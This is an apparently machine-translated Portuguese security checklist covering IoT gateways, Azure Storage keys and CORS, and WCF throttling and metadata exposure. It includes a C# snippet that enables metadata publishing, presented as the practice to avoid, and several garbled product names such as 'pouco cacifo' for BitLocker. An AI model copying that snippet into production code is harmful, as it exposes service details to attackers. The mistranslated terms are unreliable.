| **Passos** | Não ativar ou desativar funcionalidades ou serviços do sistema operacional que não é necessário para o funcionamento da solução. Para por exemplo, se o dispositivo não necessita de uma interface do Usuário a serem implantados, instalar o Windows IoT Core no modo sem periféricos. |

## <a id="field-bit-locker"></a>Encriptar o SO e partições adicionais do Gateway de campo de IoT com pouco cacifo

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de campo de IoT | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | Windows 10 IoT Core implementa uma versão simples pouco cacifo de encriptação do dispositivo, que tem uma forte dependência na presença de um TPM na plataforma, incluindo o protocolo necessário preOS em UEFI que realiza as medidas necessárias. Essas medidas preOS Certifique-se de que o sistema operacional tem mais tarde um registo definitivo de como o sistema operacional foi iniciado. Encripte as partições de sistema operacional usando o pouco cacifo e quaisquer partições adicionais também caso eles armazenam os dados confidenciais. |

## <a id="default-change"></a>Certifique-se de que as credenciais de início de sessão padrão do gateway de campo são alteradas durante a instalação

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de campo de IoT | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | Certifique-se de que as credenciais de início de sessão padrão do gateway de campo são alteradas durante a instalação |

## <a id="cloud-firmware"></a>Certifique-se de que o Gateway de nuvem implementa um processo para manter o firmware de dispositivos ligados atualizado

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Gateway de Cloud da IoT | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | Escolha de gateway - IoT Hub do Azure |
| **Referências**              | [Visão geral do gerenciamento de dispositivo de Hub do IoT](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [como atualizar o Firmware do dispositivo](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
| **Passos** | LWM2M é um protocolo da Open Mobile Alliance para gestão de dispositivos de IoT. Permite a gestão de dispositivos de IoT do Azure para interagir com dispositivos físicos com tarefas de dispositivo. Certifique-se de que o Gateway de nuvem implementa um processo de manter regularmente o dispositivo e outros dados de configuração atualizados com a gestão de dispositivos do Azure IoT Hub. |

## <a id="controls-policies"></a>Certifique-se de que os dispositivos têm controlos de segurança de ponto de extremidade configurados de acordo com as políticas organizacionais

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Limite de fidedignidade de máquina | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | N/A  |
| **Passos** | Certifique-se de que os dispositivos tem controlos de segurança de ponto de extremidade, como o cacifo de bits para a encriptação ao nível do disco, software antivírus com assinaturas atualizadas, com base firewall, atualizações de SO do anfitrião, etc. estão configurados de acordo com as políticas de segurança organizacional de políticas de grupo. |

## <a id="secure-keys"></a>Certifique-se a gestão segura das chaves de acesso de armazenamento do Azure

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Storage do Azure | 
| **Fase do SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | [Guia de segurança de armazenamento do Azure - gestão de chaves de conta de armazenamento Your](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Passos** | <p>Armazenamento de chaves: Recomenda-se para armazenar as chaves de acesso de armazenamento do Azure no Azure Key Vault, como um segredo e tenham os aplicativos de obter a chave do Cofre de chaves. Esta opção é recomendada devido ao seguinte:</p><ul><li>O aplicativo nunca terá o inseridos no código de chave de armazenamento num arquivo de configuração, o que remove essa Avenida de alguém o acesso às chaves sem a permissão específico</li><li>Acesso às chaves pode ser controlado com o Azure Active Directory. Isso significa que um proprietário da conta pode conceder acesso a muitos dos aplicativos que precisam para obter as chaves do Azure Key Vault. Outras aplicações não poderão aceder às chaves, sem conceder-lhes permissão especificamente</li><li>Regeneração da chave: Recomenda-se para ter um processo para voltar a gerar chaves de acesso de armazenamento do Azure por motivos de segurança. Detalhes sobre por que e como planejar a nova geração de chaves estão documentados no artigo de referência do guia de segurança de armazenamento do Azure</li></ul>|

## <a id="cors-storage"></a>Certifique-se de que apenas as origens confiáveis são permitidas se CORS está ativado no armazenamento do Azure

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Storage do Azure | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/A  |
| **Referências**              | [Suporte CORS para os serviços de armazenamento do Azure](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Passos** | O armazenamento do Azure permite-lhe ativar o CORS – entre a partilha de recursos de origem. Para cada conta de armazenamento, pode especificar domínios que podem aceder aos recursos nessa conta de armazenamento. Por predefinição, o CORS está desativada em todos os serviços. Pode ativar a CORS utilizando a API REST ou biblioteca de cliente do armazenamento para chamar um dos métodos para definir as políticas do serviço. |

## <a id="throttling"></a>Ativar o serviço do WCF, limitação de recursos

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET Framework 3 |
| **Atributos**              | N/A  |
| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Reforçamos Unido](https://vulncat.fortify.com) |
| **Passos** | <p>Não colocar um limite na utilização de recursos do sistema pode resultar no esgotamento de recursos e, por fim, uma negação de serviço.</p><ul><li>**EXPLICAÇÃO:** Windows Communication Foundation (WCF) oferece a capacidade de limitar os pedidos de serviço. Permitir que demasiados pedidos de cliente pode inundar um sistema e esgotar os respetivos recursos. Por outro lado, permitindo que apenas um pequeno número de pedidos para um serviço pode impedir que usuários legítimos com o serviço. Cada serviço deve ser ajustado para individualmente e configurado para permitir a quantidade apropriada de recursos.</li><li>**RECOMENDAÇÕES** da ativar WCF funcionalidade de limitação do serviço e limites do conjunto são adequadas para a sua aplicação.</li></ul>|

### <a name="example"></a>Exemplo
Segue-se um exemplo de configuração com a otimização ativadas:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a id="info-metadata"></a>Divulgação de informações do WCF por meio de metadados

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | WCF | 
| **Fase do SDL**               | Compilação |  
| **Tecnologias aplicáveis** | .NET Framework 3 |
| **Atributos**              | N/A  |
| **Referências**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Reforçamos Unido](https://vulncat.fortify.com) |
| **Passos** | Metadados podem ajudar a saber mais sobre o sistema e planejar uma forma de ataque de invasores. Os serviços WCF podem ser configurados para expor metadados. Metadados dá-informações de descrição detalhada do serviço e não devem ser transmitido em ambientes de produção. O `HttpGetEnabled`  /  `HttpsGetEnabled` propriedades da classe ServiceMetaData define se um serviço irá expor os metadados | 

### <a name="example"></a>Exemplo
O código a seguir Instrua o WCF para difundir metadados de um serviço
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Não de difusão de metadados do serviço num ambiente de produção. Definir o HttpGetEnabled / HttpsGetEnabled propriedades do ServiceMetaData classe como false. 

### <a name="example"></a>Exemplo
O código a seguir Instrua o WCF não difundir metadados de um serviço. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
